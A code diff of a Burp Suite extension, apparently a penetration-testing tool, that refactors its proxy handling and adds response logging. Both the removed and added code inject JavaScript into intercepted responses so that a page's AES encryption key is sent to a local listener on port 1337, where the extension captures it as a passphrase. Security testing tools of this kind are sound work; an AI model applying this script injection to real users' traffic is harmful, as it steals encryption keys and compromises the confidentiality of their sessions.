@@ -10,8 +10,10 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.Map;
 import java.util.Random;
 import java.util.regex.Pattern;
 import java.util.stream.Collectors;
@@ -29,7 +31,7 @@ import javax.swing.SwingUtilities;
 import javax.swing.table.AbstractTableModel;
 import javax.swing.table.TableModel;
 
-public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IMessageEditorController, IMessageEditorTabFactory, IContextMenuFactory, IScannerInsertionPointProvider, IHttpListener, IProxyListener {
+public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IMessageEditorController, IMessageEditorTabFactory, IContextMenuFactory, IScannerInsertionPointProvider, IProxyListener {
 
 	private static final long serialVersionUID = 1L;
 
@@ -46,6 +48,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 	private IMessageEditor responseViewer;
 	private IHttpRequestResponse currentlyDisplayedItem;
 	private static final List<LogEntry> log = new ArrayList<LogEntry>();
+	private Map<Integer,Integer> refs = new HashMap<>();
 
 	private JTabbedPane mainTab;
 	private PreferencesPane preferencesPane;
@@ -116,7 +119,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		callbacks.registerScannerInsertionPointProvider(this);
 		callbacks.registerMessageEditorTabFactory(this);
 		callbacks.registerContextMenuFactory(this);
-		callbacks.registerHttpListener(this);
 		callbacks.registerProxyListener(this);
 
 		// UI
@@ -574,65 +576,9 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 		if (preferencesPane.getPluginStatus())
 		{
-			if (!messageIsRequest)
-			{
-				IHttpRequestResponse messageInfo = message.getMessageInfo();
-				IResponseInfo x = helpers.analyzeResponse(messageInfo.getResponse());
+			IHttpRequestResponse messageInfo = message.getMessageInfo();
 
-				List<String> hdr = x.getHeaders();
-				int check = 0;
-				for (String s : hdr) {
-					if (s.contains("javascript") && s.contains("Content-Type"))
-					{
-						check = 1;
-						break;
-					}
-				}
-
-				if (check == 1)
-				{
-					String match = new String("success.call(this, AESEncryptionKey);");
-					String replace = new String("setTimeout(function(){ success.call(this, AESEncryptionKey); }, 888); var x = new XMLHttpRequest(); x.open(\"GET\", \"https://localhost:1337/?p=\"+AESEncryptionKey, true); x.send();");
-					String response = new String(messageInfo.getResponse());
-
-					if (response.contains(match))
-					{
-						String r = response.replaceFirst(Pattern.quote(match), replace);
-						int bodyOffset = x.getBodyOffset();
-						byte[] res = r.substring(bodyOffset).getBytes();
-						message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
-						message.getMessageInfo().setComment("Hooked by " + EXTENSION_NAME);
-						message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
-					}
-				}
-			}
-			else
-			{
-				IHttpRequestResponse messageInfo = message.getMessageInfo();
-				IHttpService httpService = messageInfo.getHttpService();
-
-				if (httpService.getHost().equals("localhost") && httpService.getPort() == 1337)
-				{
-					IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
-					URL url = requestInfo.getUrl();
-					String p = url.getFile().substring(4);
-					mainPassphrase = helpers.stringToBytes(p);
-					preferencesPane.setPassphrase(p);
-					message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
-				}
-			}
-		}
-	}
-
-	// IHttpListener
-
-	@Override
-	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
-
-		if (preferencesPane.getPluginStatus())
-		{
-			// get new passphrase
-			if (messageIsRequest && toolFlag == IBurpExtenderCallbacks.TOOL_PROXY)
+			if (messageIsRequest)
 			{
 				IParameter d = helpers.getRequestParameter(messageInfo.getRequest(), mainParameter);
 				if (d != null)
@@ -642,8 +588,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 						int row = log.size();
 						IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(messageInfo);
 						IRequestInfo irequestInfo = helpers.analyzeRequest(irequestResponse);
+						int ref = message.getMessageReference();
+
 						log.add(new LogEntry(irequestResponse, irequestInfo, helpers.base64Decode(helpers.urlDecode(d.getValue())), helpers.bytesToString(mainPassphrase)));
 						fireTableRowsInserted(row, row);
+
+						refs.put(ref, row);
 
 						List<IParameter> c = new ArrayList<IParameter>();
 						List<IParameter> requestParams = irequestInfo.getParameters();
@@ -655,6 +605,71 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 						}
 
 						if (c.size() > 0) setCurrentSession(c);
+					}
+				}
+				else
+				{
+					IHttpService httpService = messageInfo.getHttpService();
+
+					if (httpService.getHost().equals("localhost") && httpService.getPort() == 1337)
+					{
+						IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
+						URL url = requestInfo.getUrl();
+						String p = url.getFile().substring(4);
+						mainPassphrase = helpers.stringToBytes(p);
+						preferencesPane.setPassphrase(p);
+						message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
+					}
+				}
+			}
+			else // processing HTTP Responses
+			{
+				int ref = message.getMessageReference();
+				if (refs.containsKey(ref))
+				{
+					synchronized(log)
+					{
+						int row = refs.get(ref);
+						LogEntry r = log.get(row);
+						if (r != null)
+						{
+							IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(messageInfo);
+							r.response = irequestResponse.getResponse();
+							log.set(row, r);
+							fireTableRowsUpdated(row, row);
+						}
+						refs.remove(ref);
+					}
+				}
+				else
+				{
+					IResponseInfo x = helpers.analyzeResponse(messageInfo.getResponse());
+
+					List<String> hdr = x.getHeaders();
+					int check = 0;
+					for (String s : hdr) {
+						if (s.contains("javascript") && s.contains("Content-Type"))
+						{
+							check = 1;
+							break;
+						}
+					}
+
+					if (check == 1)
+					{
+						String match = new String("success.call(this, AESEncryptionKey);");
+						String replace = new String("setTimeout(function(){ success.call(this, AESEncryptionKey); }, 888); var x = new XMLHttpRequest(); x.open(\"GET\", \"https://localhost:1337/?p=\"+AESEncryptionKey, true); x.send();");
+						String response = new String(messageInfo.getResponse());
+
+						if (response.contains(match))
+						{
+							String r = response.replaceFirst(Pattern.quote(match), replace);
+							int bodyOffset = x.getBodyOffset();
+							byte[] res = r.substring(bodyOffset).getBytes();
+							message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
+							message.getMessageInfo().setComment("Hooked by " + EXTENSION_NAME);
+							message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
+						}
 					}
 				}
 			}
@@ -794,6 +809,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 			// show the log entry for the selected row
 			LogEntry logEntry = log.get(row);
 			requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
+			byte[] tmp = logEntry.response;
+			if (tmp != null && tmp.length > 0) responseViewer.setMessage(tmp, false);
 			currentlyDisplayedItem = logEntry.requestResponse;
 
 			super.changeSelection(row, col, toggle, extend);
@@ -806,6 +823,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 	{
 		final IHttpRequestResponsePersisted requestResponse;
 		final IRequestInfo requestInfo;
+		byte[] response;
 
 		final String host;
 		final String method;
